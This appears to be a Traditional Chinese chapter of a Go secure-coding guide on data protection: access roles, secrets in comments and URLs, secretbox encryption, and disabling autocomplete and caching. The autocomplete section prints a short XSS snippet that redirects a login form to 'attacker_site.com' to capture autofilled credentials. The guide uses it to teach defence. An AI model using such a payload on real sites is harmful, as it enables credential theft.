資料保護
===============

在現今，關於安全最重要的事情就是資料保護了，你不會想要看到下面這張圖的：

![All your data are belong to us](files/cB52MA.jpeg)

簡單來說，任何從網站來的資料，你都會需要保護它們。在本章中，我們會來看看確保這些資料安全的一些做法。

你要做的第一件事情，就是確保給予使用者正確的權限，並且限制他們只存取他們需要的功能。

舉例來說，一個簡單的線上購物網站會需要以下幾個角色：

* _銷售人員_: 權限只能查看購物車
* _行銷人員_: 權限只能查看統計報表
* _開發人員_: 權限只能修改頁面內容

此外，在系統設定(也就是網站伺服器的設定)，你也應該定義正確的權限。

主要的工作就是為每個使用者，不論是網站或系統，都定義正確的角色。

角色分離和訪問控制的內容，你可以在[訪問控制][1]章節中進行更詳細的閱讀。

## 移除敏感資訊

包含敏感資訊的快取或暫存檔案，在不需要使用時應該要盡快移除。如果你依舊需要使用者它們，可以將它們移到被保護的區域，或是加密它們。

### 註解

某些時候開發者會在原始碼中留下註解，像是 _待完成清單_。而有時候，在最糟糕的情況下，有可能會留下某些認證資訊。

```go
// Secret API endpoint - /api/mytoken?callback=myToken
fmt.Println("Just a random code")
```

在上面的範例中，開發者留下了一個帶有敏感資訊的註解，當你的程式碼沒有被妥善保存時，可能會被有心人士拿來利用。

### 網址

使用 HTTP GET 來傳遞敏感資訊會使得網站變得脆弱，因為：

1. 當你沒有使用 HTTPS 時，資料可能會被攔截。
2. 瀏覽器的歷史紀錄會保存使用者的資訊。如果網址中包含了使用者的 ID 或是 token，同時這些資訊沒有過期時，就很有可能被竊取。

```go
req, _ := http.NewRequest("GET", "http://mycompany.com/api/mytoken?api_key=000s3cr3t000", nil)
```

當你的網站嘗試使用 ```api_key``` 到第三方服務取得資訊時，當任何人監聽了你的網路，資料就很有可能被竊取。這是因為你沒有使用 HTTPS，而且你透過 GET 來傳遞你的參數。

同樣的，如果你透過以下方式來存取服務：

```
http://mycompany.com/api/mytoken?api_key=000s3cr3t000
```

這些資料會被存到瀏覽器的歷史紀錄中，就很有可能被竊取。

解決的辦法是總是使用 HTTPS，並且將重要資料透過 POST 傳送，如果可能，使用一次性的 ID 或 token。

### 資訊就是力量

你應該總是移除正式環境系統文件，某些文件中會揭露版本資訊，甚至包含了某些可以攻擊系統的方法(例如：說明文件、變更日誌等)。

身為開發者，你應該要允許使用者可以刪除自己的敏感資訊，想像一下使用者想要刪除不再使用的信用卡資訊，而你應該要允許他們做這件事情。

所有不需要使用的資訊應該要從系統中刪除。

#### 加密是關鍵

所有高度敏感的資訊在系統中都應該被加密，在 Go 語言中使用[軍事等級][2]的加密方法。更多資訊請參考[加密實踐][3]章節。

如果你需要在某個地方實作你的程式碼，只需要使用執行檔。現在沒有一個保證的方法可以避免逆向工程。

對於不同的使用者，給予不同權限是保護程式碼的最佳實踐。

不要使用明文儲存使用者密碼、資料庫連線字串(你可以在[資料庫安全][4]的章節中查看如何安全的使用連線字串)或其他敏感的資訊。

底下是使用 Go 的 `golang.org/x/crypto/nacl/secretbox` 套件進行加密的一個範例：


```go
// Load your secret key from a safe place and reuse it across multiple
// Seal calls. (Obviously don't use this example key for anything
// real.) If you want to convert a passphrase to a key, use a suitable
// package like bcrypt or scrypt.
secretKeyBytes, err := hex.DecodeString("6368616e676520746869732070617373776f726420746f206120736563726574")
if err != nil {
    panic(err)
}

var secretKey [32]byte
copy(secretKey[:], secretKeyBytes)

// You must use a different nonce for each message you encrypt with the
// same key. Since the nonce here is 192 bits long, a random value
// provides a sufficiently small probability of repeats.
var nonce [24]byte
if _, err := io.ReadFull(rand.Reader, nonce[:]); err != nil {
    panic(err)
}

// This encrypts "hello world" and appends the result to the nonce.
encrypted := secretbox.Seal(nonce[:], []byte("hello world"), &nonce, &secretKey)

// When you decrypt, you must use the same nonce and key you used to
// encrypt the message. One way to achieve this is to store the nonce
// alongside the encrypted message. Above, we stored the nonce in the first
// 24 bytes of the encrypted text.
var decryptNonce [24]byte
copy(decryptNonce[:], encrypted[:24])
decrypted, ok := secretbox.Open([]byte{}, encrypted[24:], &decryptNonce, &secretKey)
if !ok {
    panic("decryption error")
}

fmt.Println(string(decrypted))
```

輸出是：

```
hello world
```

## 停用你不需要的功能

另一個降低被攻擊風險的方式是停用系統中任何你不需要的功能或服務。

### 自動完成

根據 [Mozilla 文件][1]，你可以透過以下方式停用自動完成的功能：

```html
<form method="post" action="/form" autocomplete="off">
```

或是這樣做：

```html
<input type="text" id="cc" name="cc" autocomplete="off">
```

這對於在登入表單上停用動完成特別有用。想像一下當登入頁面含有 XSS 的內容時，如果攻擊者建立以下的程式碼：

```javascript
window.setTimeout(function() {
  document.forms[0].action = 'http://attacker_site.com';
  document.forms[0].submit();
}
), 10000);
```

他將會把自動完成中的內容送到 `attacker_site.com` 網站。

### 快取

在頁面中包含敏感資料的快取應該要被禁止。

這可以透過在 Header 中設置對應的值來達成：

```go
w.Header().Set("Cache-Control", "no-cache, no-store")
w.Header().Set("Pragma", "no-cache")
```

`no-cache` 告訴瀏覽器在使用任何快取前要先向伺服器詢問最新的資料，而不是告訴瀏覽器 _不要快取資料_。

另一方面，`no-store` 才是告訴瀏覽器 - _嘿！不要快取_，而且不要儲存使用者請求或回應的任何資料。

`Pragma` header 是支援 HTTP/1.0 請求的。

[1]: https://developer.mozilla.org/en-US/docs/Web/Security/Securing_your_site/Turning_off_form_autocompletion
[2]: https://godoc.org/golang.org/x/crypto
[3]: /cryptographic-practices/README.md
[4]: /database-security/README.md
